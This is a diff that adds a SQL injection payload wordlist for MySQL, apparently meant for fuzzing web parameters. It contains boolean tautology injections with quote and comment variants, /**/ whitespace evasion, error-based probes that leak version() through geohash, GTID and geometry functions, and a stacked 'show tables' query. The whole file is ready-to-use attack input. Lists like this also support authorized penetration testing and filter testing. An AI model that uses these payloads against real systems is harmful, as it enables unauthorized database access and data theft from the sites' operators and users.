@@ -1,0 +1,208 @@
+1||
+1||1=1
+1||1=1#
+1||1=1--+
+1||2<>1
+1||2<>1#
+1||2<>1--+
+1||1 like 1#
+1||1 like 1
+1||1 like 1--+
+1||1 regexp 1
+1||1 regexp 1#
+1||1 regexp 1--+
+1||1/**/like/**/1
+1||1/**/like/**/1#
+1||1/**/like/**/1--+
+1||1/**/regexp/**/1
+1||1/**/regexp/**/1#
+1||1/**/regexp/**/1--+
+1 or 1=1
+1 or 1=1--+
+1 or 1=1#
+1 or 2<>1
+1 or 2<>1--+
+1 or 2<>1#
+1 or/**/1=1
+1 or/**/1=1 --
+1 or/**/1=1#
+1 or/**/2<>1
+1 or/**/2<>1 --
+1 or/**/2<>1#
+1 or/**/1/**/regexp/**/1
+1 or/**/1/**/regexp/**/1--+
+1 or/**/1/**/regexp/**/1#
+1 or/**/1/**/like/**/1
+1 or/**/1/**/like/**/1--+
+1 or/**/1/**/like/**/1#
+1^1
+1'||'
+1'||1='1
+1'||1=1#
+1'||1=1--+
+1'||2<>'1
+1'||2<>1#
+1'||2<>1--+
+1'||1 like 1#
+1'||1 like '1
+1'||1 like 1--+
+1'||1 regexp '1
+1'||1 regexp 1#
+1'||1 regexp 1--+
+1'||1/**/like/**/'1
+1'||1/**/like/**/1#
+1'||1/**/like/**/1--+
+1'||1/**/regexp/**/'1
+1'||1/**/regexp/**/1#
+1'||1/**/regexp/**/1--+
+1'or 1='1
+1'or 1=1--+
+1'or 1=1#
+1'or 2<>'1
+1'or 2<>1--+
+1'or 2<>1#
+1'or/**/1='1
+1'or/**/1=1 --
+1'or/**/1=1#
+1'or/**/2<>'1
+1'or/**/2<>1 --
+1'or/**/2<>1#
+1'or/**/1/**/regexp/**/'1
+1'or/**/1/**/regexp/**/1--+
+1'or/**/1/**/regexp/**/1#
+1'or/**/1/**/like/**/'1
+1'or/**/1/**/like/**/1--+
+1'or/**/1/**/like/**/1#
+1'^'1
+2-1
+1"||"
+1"||1="1
+1"||1=1#
+1"||1=1--+
+1"||2<>"1
+1"||2<>1#
+1"||2<>1--+
+1"||1 like 1#
+1"||1 like "1
+1"||1 like 1--+
+1"||1 regexp "1
+1"||1 regexp 1#
+1"||1 regexp 1--+
+1"||1/**/like/**/'1
+1"||1/**/like/**/1#
+1"||1/**/like/**/1--+
+1"||1/**/regexp/**/"1
+1"||1/**/regexp/**/1#
+1"||1/**/regexp/**/1--+
+1"or 1="1
+1"or 1=1--+
+1"or 1=1#
+1"or 2<>"1
+1"or 2<>1--+
+1"or 2<>1#
+1"or/**/1="1
+1"or/**/1=1 --
+1"or/**/1=1#
+1"or/**/2<>"1
+1"or/**/2<>1 --
+1"or/**/2<>1#
+1"or/**/1/**/regexp/**/"1
+1"or/**/1/**/regexp/**/1--+
+1"or/**/1/**/regexp/**/1#
+1"or/**/1/**/like/**/"1
+1"or/**/1/**/like/**/1--+
+1"or/**/1/**/like/**/1#
+1"^"1
+-1
+1
+1'
+1'#
+1'--+
+1')#
+1')--+
+1"
+1"#
+1"--+
+1")#
+1")--+
+1%dd%27
+1%dd%27%23
+and(1=1)
+and(1=2)
+and(1<>1)
+and(1<>2)
+a()
+1 and a()
+1'and a()#
+1'&& a()#
+1'and/**/a()#
+1'&&/**/a()#
+1'and a()--+
+1'&& a()--+
+1'and/**/a()--+
+1'&&/**/a()--+
+ST_LatFromGeoHash(version())
+1 and ST_LatFromGeoHash(version())
+1'and ST_LatFromGeoHash(version())#
+1'&& ST_LatFromGeoHash(version())#
+1'and(ST_LatFromGeoHash(version()))#
+1'and ST_LatFromGeoHash(version())--+
+1'&& ST_LatFromGeoHash(version())--+
+1'and(ST_LatFromGeoHash(version()))--+
+ST_LongFromGeoHash(version())
+1 and ST_LongFromGeoHash(version())
+1'and ST_LongFromGeoHash(version())#
+1'&& ST_LongFromGeoHash(version())#
+1'and(ST_LongFromGeoHash(version()))#
+1'and ST_LongFromGeoHash(version())--+
+1'&& ST_LongFromGeoHash(version())--+
+1'and(ST_LongFromGeoHash(version()))--+
+GTID_SUBSET(version(),1)
+1 and GTID_SUBSET(version(),1)
+1'and GTID_SUBSET(version(),1)#
+1'&& GTID_SUBSET(version(),1)#
+1'and(GTID_SUBSET(version(),1))#
+1'and GTID_SUBSET(version(),1)--+
+1'&& GTID_SUBSET(version(),1)--+
+1'and(GTID_SUBSET(version(),1))--+
+GTID_SUBTRACT(version(),1)
+1 and GTID_SUBTRACT(version(),1)
+1'and GTID_SUBTRACT(version(),1)#
+1'&& GTID_SUBTRACT(version(),1)#
+1'and(GTID_SUBTRACT(version(),1))#
+1'and GTID_SUBTRACT(version(),1)--+
+1'&& GTID_SUBTRACT(version(),1)--+
+1'and(GTID_SUBTRACT(version(),1))--+
+ST_PointFromGeoHash(version(),1)
+1 and ST_PointFromGeoHash(version(),1)
+1'and ST_PointFromGeoHash(version(),1)#
+1'&& ST_PointFromGeoHash(version(),1)#
+1'and(ST_PointFromGeoHash(version(),1))#
+1'and ST_PointFromGeoHash(version(),1)--+
+1'&& ST_PointFromGeoHash(version(),1)--+
+1'and(ST_PointFromGeoHash(version(),1))--+
+geometrycollection(id)
+multipoint(id)
+polygon(id)
+multipolygon(id)
+linestring(id)
+multilinestring(id)
+pow(999,999)
+1' and geometrycollection(id)#
+1' and multipoint(id)#
+1' and polygon(id)#
+1' and multipolygon(id)#
+1' and linestring(id)#
+1' and multilinestring(id)#
+1' and pow(999,999)#
+1' and 1=1 and pow(999,999)#
+1' and 1=2 and pow(999,999)#
+1' and geometrycollection(id)--+
+1' and multipoint(id)--+
+1' and polygon(id)--+
+1' and multipolygon(id)--+
+1' and linestring(id)--+
+1' and multilinestring(id)--+
+1' and pow(999,999)--+
+1';show tables;#
+1';show tables;--+
